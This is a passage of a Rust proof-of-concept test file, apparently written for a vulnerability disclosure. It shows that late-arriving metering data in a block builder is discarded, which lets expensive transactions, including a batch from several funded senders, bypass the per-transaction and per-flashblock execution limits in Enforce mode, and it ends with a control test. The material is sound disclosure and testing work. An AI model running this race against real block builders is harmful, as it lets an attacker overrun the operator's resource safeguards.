        "[POC][control][per-tx] metered tx rejected: {err}; predicted_us={} per_tx_limit_us={PER_TX_EXECUTION_LIMIT_US}",
        metering.total_execution_time_us
    );
}

/// Direct call into the real `ExecutionInfo::is_tx_over_limits` arithmetic
/// proving that, with the same configured operator policy, a tx whose
/// metering is **missing** (`execution_time_us=None, state_root_gas=None`)
/// passes the per-tx Enforce branch — because both Enforce branches are
/// gated on `if let Some(_)`. This is the bug primitive at the limit-check
/// arithmetic level.
fn assert_unmetered_individually_passes() {
    let info = ExecutionInfo::default();
    let limits = realistic_resource_limits();

    let unmetered = TxResources {
        gas_limit: RACE_TX_DECLARED_GAS_LIMIT,
        execution_time_us: None,
        state_root_gas: None,
        ..Default::default()
    };

    info.is_tx_over_limits(&unmetered, &limits).expect(
        "BUG PRIMITIVE: TxResources with None resource fields skips the per-tx Enforce check",
    );

    println!(
        "[POC][primitive] same realistic limits PASS when execution_time_us=None and state_root_gas=None"
    );
}

/// Arithmetic check that the cumulative per-flashblock budget would have been
/// breached by N race-affected txs if each contributed `tx_us` execution time
/// to the flashblock counter, given the configured `PER_FLASHBLOCK_BUDGET_US`.
fn assert_cumulative_overrun_arithmetic(per_tx_us: u128, n: usize, budget_us: u128) {
    let cumulative = (n as u128).saturating_mul(per_tx_us);
    assert!(
        cumulative > budget_us,
        "PoC parameter check: cumulative claim ({cumulative}us) must exceed budget ({budget_us}us); update RACE_TX_COUNT or RACE_TX_PREDICTED_EXECUTION_US"
    );
    let retry_flashblocks_per_block = 5u64;
    let retry_batch_gas_limit = RETRY_BUILD_BLOCK_GAS_LIMIT / retry_flashblocks_per_block;
    let total_declared_gas = (n as u64).saturating_mul(RACE_TX_DECLARED_GAS_LIMIT);
    assert!(
        total_declared_gas <= retry_batch_gas_limit,
        "PoC parameter check: all N txs must fit in one retry flashblock gas target; total_declared_gas={total_declared_gas} retry_batch_gas_limit={retry_batch_gas_limit}"
    );

    let pct = cumulative.saturating_mul(100) / budget_us.max(1);
    println!(
        "[POC][cumulative-arith] n={n} per_tx_us={per_tx_us} cumulative={cumulative}us budget={budget_us}us overrun={pct}% retry_batch_gas_limit={retry_batch_gas_limit} total_declared_gas={total_declared_gas}"
    );
}

fn vulnerable_builder_config(store: Arc<MeteringStore>) -> BuilderConfig {
    let metering_provider: Arc<dyn MeteringProvider> = store;

    let mut config = BuilderConfig::for_tests();
    config.execution_metering_mode = ExecutionMeteringMode::Enforce;
    config.metering_provider = metering_provider;
    // metering_wait_duration=None disables the only branch that clears
    // `needed_at`. With wait_duration set, txs that miss metering inside the
    // wait window are skipped via `MeteringDataPending` and `needed_at` is
    // cleared. Outside that window, every other non-inclusion path leaves
    // `needed_at` set — which is the bug.
    config.metering_wait_duration = None;
    config.max_execution_time_per_tx_us = Some(PER_TX_EXECUTION_LIMIT_US);
    config.flashblock_execution_time_budget_us = Some(PER_FLASHBLOCK_BUDGET_US);
    config.block_state_root_gas_limit = Some(PER_BLOCK_STATE_ROOT_GAS_LIMIT);
    config.block_time = Duration::from_secs(1);
    config.flashblocks_interval = Duration::from_millis(200);
    config
}

// ---------------------------------------------------------------------------
// TEST 1 — primitive (single-tx state-machine bug)
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn metering_late_discard_single_tx_primitive() -> eyre::Result<()> {
    println!("[POC][test1] single-tx state-machine bug primitive");
    println!(
        "[POC][test1][config] PER_TX_EXECUTION_LIMIT_US={PER_TX_EXECUTION_LIMIT_US} \
         PER_FLASHBLOCK_BUDGET_US={PER_FLASHBLOCK_BUDGET_US} \
         RACE_TX_PREDICTED_EXECUTION_US={RACE_TX_PREDICTED_EXECUTION_US}"
    );

    let store = Arc::new(MeteringStore::new(true, 1024));
    let config = vulnerable_builder_config(Arc::clone(&store));
    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?;

    // Submit a real big tx through the real txpool.
    let pending = driver
        .create_transaction()
        .random_big_transaction()
        .with_gas_limit(RACE_TX_DECLARED_GAS_LIMIT)
        .send()
        .await?;
    let tx_hash = *pending.tx_hash();
    println!("[POC][test1][submit] target tx submitted via real txpool: tx_hash={tx_hash}");

    // First build round: low block gas limit forces ordinary gas-fit
    // non-inclusion. The tx is considered, `needed_at[tx_hash]` is set inside
    // the real `MeteringStore::get()`, but the tx is excluded for gas-fit —
    // a non-`MeteringDataPending` reason that does NOT clear `needed_at`.
    let first_driver = rbuilder.driver().await?.with_gas_limit(FIRST_BUILD_BLOCK_GAS_LIMIT);
    let first_block = first_driver.build_new_block_with_current_timestamp(None).await?;
    let first_included = first_block.includes(&tx_hash);
    println!(
        "[POC][test1][round1] block_hash={:?} target_included={first_included} store={store:?}",
        first_block.header.hash
    );
    assert!(
        !first_included,
        "setup: target tx must be considered but not included when block gas limit ({FIRST_BUILD_BLOCK_GAS_LIMIT}) < declared gas limit ({RACE_TX_DECLARED_GAS_LIMIT})"
    );

    // Compute the valid late metering and prove arithmetically that the
    // configured per-tx Enforce limit MUST reject this tx if metering is
    // respected, while a missing metering (None fields) passes.
    let late = race_metering_response(tx_hash);
    assert_metered_individually_rejected(&late);
    assert_unmetered_individually_passes();

    // Insert through `MeteringProvider::insert` — the same boundary the
    // `base_setMeteringInformation` RPC handler invokes in production.
    println!(
        "[POC][test1][late-insert] inserting valid late MeterBundleResponse via MeteringProvider::insert: tx_hash={tx_hash} predicted_us={}",
        late.total_execution_time_us
    );
    MeteringProvider::insert(store.as_ref(), tx_hash, late.clone());

    // The bug: `insert()` sees `needed_at[tx_hash]` set, treats this as
    // "late arrival no longer useful", and silently discards the response.
    // Do not call `get()` here, because a fresh `get()` miss would itself
    // mutate `needed_at`; cache length is the clean proof that no response
    // was retained for the retry builder round.
    assert_eq!(
        store.len(),
        0,
        "BUG: valid late MeterBundleResponse must have been discarded due to needed_at instead of cached"
    );
    println!(
        "[POC][test1][bug] store.len()==0 after late insert (response discarded) store={store:?}"
    );

    // Retry round with normal block gas limit. `MeteringStore::get(tx_hash)`
    // returns None; the builder constructs `TxResources { execution_time_us:
    // None, state_root_gas: None }`; `is_tx_over_limits()` skips both Enforce
    // branches; the tx is included even though valid metering would have
    // rejected it.
    let retry_driver = rbuilder.driver().await?.with_gas_limit(RETRY_BUILD_BLOCK_GAS_LIMIT);
    let retry_block = retry_driver.build_new_block_with_current_timestamp(None).await?;
    let retry_included = retry_block.includes(&tx_hash);
    println!(
        "[POC][test1][round2] block_hash={:?} target_included={retry_included}",
        retry_block.header.hash
    );
    assert!(
        retry_included,
        "BUG: target tx must be included on retry under Enforce despite valid expensive metering having arrived"
    );

    println!(
        "[POC][test1][result] CONFIRMED: late metering discarded; tx included unmetered under Enforce; per-tx limit ({PER_TX_EXECUTION_LIMIT_US}us) bypassed for predicted ({}us) execution",
        late.total_execution_time_us
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// TEST 2 — cumulative per-flashblock budget bypass
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn metering_late_discard_cumulative_flashblock_overrun() -> eyre::Result<()> {
    println!("[POC][test2] cumulative per-flashblock budget bypass via N race-affected txs");
    println!(
        "[POC][test2][config] RACE_TX_COUNT={RACE_TX_COUNT} \
         RACE_TX_PREDICTED_EXECUTION_US={RACE_TX_PREDICTED_EXECUTION_US} \
         PER_TX_EXECUTION_LIMIT_US={PER_TX_EXECUTION_LIMIT_US} \
         PER_FLASHBLOCK_BUDGET_US={PER_FLASHBLOCK_BUDGET_US}"
    );

    assert_cumulative_overrun_arithmetic(
        RACE_TX_PREDICTED_EXECUTION_US,
        RACE_TX_COUNT,
        PER_FLASHBLOCK_BUDGET_US,
    );

    let store = Arc::new(MeteringStore::new(true, 1024));
    let config = vulnerable_builder_config(Arc::clone(&store));
    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?;

    // Fund N senders so each big tx can be submitted independently from
    // distinct accounts (matches realistic permissionless attacker shape).
    let mut signers = Vec::with_capacity(RACE_TX_COUNT);
    for i in 0..RACE_TX_COUNT {
        signers.push(generate_signer_from_seed(&format!("metering-late-discard-race-{i}")));
    }
    let addresses: Vec<Address> = signers.iter().map(|s| s.address()).collect();
    driver.fund_many(addresses.clone(), ONE_ETH).await?;

    // Submit N big txs through the real txpool, each from a distinct funded
    // sender, with strictly increasing priority fees so the iterator order
    // is deterministic.
    let mut tx_hashes = Vec::with_capacity(RACE_TX_COUNT);
    for (i, signer) in signers.iter().enumerate() {
        let pending = driver
            .create_transaction()
            .with_signer(signer)
            .random_big_transaction()
            .with_gas_limit(RACE_TX_DECLARED_GAS_LIMIT)
            .with_max_priority_fee_per_gas(2_000_000_000 + i as u128)
            .send()
            .await?;
        let h = *pending.tx_hash();
        tx_hashes.push(h);
        println!("[POC][test2][submit] race tx idx={i} sender={} tx_hash={h}", signer.address());
    }

    // Round 1: low block gas limit forces ALL N race-affected txs to gas-fit
    // non-inclusion. After this round, every tx_hash has `needed_at` set.
    let first_driver = rbuilder.driver().await?.with_gas_limit(FIRST_BUILD_BLOCK_GAS_LIMIT);
    let first_block = first_driver.build_new_block_with_current_timestamp(None).await?;
    let first_included = tx_hashes.iter().filter(|h| first_block.includes(*h)).count();
    println!(
        "[POC][test2][round1] block_hash={:?} included={}/{} (gas-fit non-inclusion path)",
        first_block.header.hash, first_included, RACE_TX_COUNT
    );
    assert_eq!(
        first_included, 0,
        "setup: all {RACE_TX_COUNT} race txs must be considered but not included for gas-fit reason"
    );

    // Confirm individual metered rejection arithmetic and unmetered pass.
    assert_metered_individually_rejected(&race_metering_response(tx_hashes[0]));
    assert_unmetered_individually_passes();

    // Insert valid late metering for ALL N via `MeteringProvider::insert`,
    // matching the production metering RPC handler boundary.
    for h in &tx_hashes {
        let late = race_metering_response(*h);
        println!(
            "[POC][test2][late-insert] tx_hash={h} predicted_us={} via MeteringProvider::insert",
            late.total_execution_time_us
        );
        MeteringProvider::insert(store.as_ref(), *h, late);
    }

    // The bug: every late `insert()` is discarded because the corresponding
    // `needed_at` entry is set. Cache length remains zero; if even one late
    // response were cached for retry enforcement, `store.len()` would be > 0.
    let discarded_count = RACE_TX_COUNT.saturating_sub(store.len());
    println!(
        "[POC][test2][bug] discarded_count={}/{} store={store:?}",
        discarded_count, RACE_TX_COUNT
    );
    assert_eq!(
        store.len(),
        0,
        "BUG: all valid late metering responses must have been discarded due to needed_at"
    );

    // Round 2: large block gas limit. All N race-affected txs retry. The
    // builder calls `MeteringStore::get(tx_hash)` for each — every call
    // returns None because of the bug. Each `TxResources` is built with
    // `execution_time_us: None, state_root_gas: None`. Each
    // `is_tx_over_limits()` invocation skips the Enforce branches.
    let retry_driver = rbuilder.driver().await?.with_gas_limit(RETRY_BUILD_BLOCK_GAS_LIMIT);
    let retry_block = retry_driver.build_new_block_with_current_timestamp(None).await?;
    let retry_included: Vec<TxHash> =
        tx_hashes.iter().filter(|h| retry_block.includes(*h)).copied().collect();
    let included_count = retry_included.len();

    println!(
        "[POC][test2][round2] block_hash={:?} included={}/{}",
        retry_block.header.hash, included_count, RACE_TX_COUNT
    );
    for h in &retry_included {
        println!("[POC][test2][round2][included] tx_hash={h}");
    }

    // ALL N race-affected txs are included unmetered
    // even though every one of them had valid metering arrive at the operator's
    // own RPC boundary that, if respected, would have rejected each of them
    // individually under the per-tx limit AND collectively under the per-
    // flashblock budget.
    assert_eq!(
        included_count, RACE_TX_COUNT,
        "BUG: all {RACE_TX_COUNT} race-affected txs must be included on retry under Enforce despite valid metering having arrived through the metering RPC boundary"
    );

    // Quantify the bypassed budget at the metered-claim level.
    let retry_batch_gas_limit = RETRY_BUILD_BLOCK_GAS_LIMIT / 5;
    let total_declared_gas = (RACE_TX_COUNT as u64) * RACE_TX_DECLARED_GAS_LIMIT;
    println!(
        "[POC][test2][single-flashblock-fit] retry_batch_gas_limit={retry_batch_gas_limit} total_declared_gas={total_declared_gas} => all {RACE_TX_COUNT} race txs fit one retry flashblock gas target"
    );

    let cumulative_predicted = (RACE_TX_COUNT as u128) * RACE_TX_PREDICTED_EXECUTION_US;
    let flashblock_overrun_pct = cumulative_predicted * 100 / PER_FLASHBLOCK_BUDGET_US;
    let per_tx_overrun_pct = RACE_TX_PREDICTED_EXECUTION_US * 100 / PER_TX_EXECUTION_LIMIT_US;

    println!(
        "[POC][test2][result] BUG: per-tx Enforce limit bypassed for {RACE_TX_COUNT} txs (each predicted {RACE_TX_PREDICTED_EXECUTION_US}us = {per_tx_overrun_pct}% of per-tx limit {PER_TX_EXECUTION_LIMIT_US}us)"
    );
    println!(
        "[POC][test2][result] BUG: cumulative per-flashblock budget bypassed: bypassed_metered_claim={cumulative_predicted}us = {flashblock_overrun_pct}% of flashblock_execution_time_budget_us={PER_FLASHBLOCK_BUDGET_US}us"
    );
    println!(
        "[POC][test2][result] CONFIRMED Medium: operator-configured Enforce-mode defense-in-depth bypassed at both the per-tx and per-flashblock level by ordinary public transactions hitting a non-MeteringDataPending non-inclusion race"
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// TEST 3 — control: metering present at first selection rejects under Enforce
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn metering_present_before_selection_rejects_under_enforce() -> eyre::Result<()> {
    println!("[POC][test3] control: metering present at first selection rejects under Enforce");

    let store = Arc::new(MeteringStore::new(true, 1024));
    let config = vulnerable_builder_config(Arc::clone(&store));
    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?;

    let pending = driver
        .create_transaction()
        .random_big_transaction()
        .with_gas_limit(RACE_TX_DECLARED_GAS_LIMIT)
        .send()
        .await?;
    let tx_hash = *pending.tx_hash();
    println!("[POC][test3][submit] control tx submitted: tx_hash={tx_hash}");

    let metering = race_metering_response(tx_hash);

    // Insert metering BEFORE any builder selection — this is the on-time path
    // where `needed_at` has not yet been set, so `insert()` caches normally.
    MeteringProvider::insert(store.as_ref(), tx_hash, metering);
    assert!(
        store.get(&tx_hash).is_some(),
        "control: metering inserted before any get() must be cached normally (no needed_at in this branch)"
    );
    println!("[POC][test3][cached] metering present in store before first selection");

    // With metering present, the builder reads `Some(metering)`, builds
    // `TxResources` with `execution_time_us = Some(75_000)`, and the per-tx
    // Enforce branch fires.
    let driver = rbuilder.driver().await?.with_gas_limit(RETRY_BUILD_BLOCK_GAS_LIMIT);
    let block = driver.build_new_block_with_current_timestamp(None).await?;
    let included = block.includes(&tx_hash);
    println!("[POC][test3][block] block_hash={:?} target_included={included}", block.header.hash);
    assert!(
        !included,
        "control: with metering present at first selection, Enforce per-tx limit MUST reject the tx"
    );

    println!(
        "[POC][test3][result] CONFIRMED: when metering is present at first selection, Enforce correctly rejects; the bug is specific to the late-discard state-machine, not the limit configuration"
    );

    Ok(())
}
```
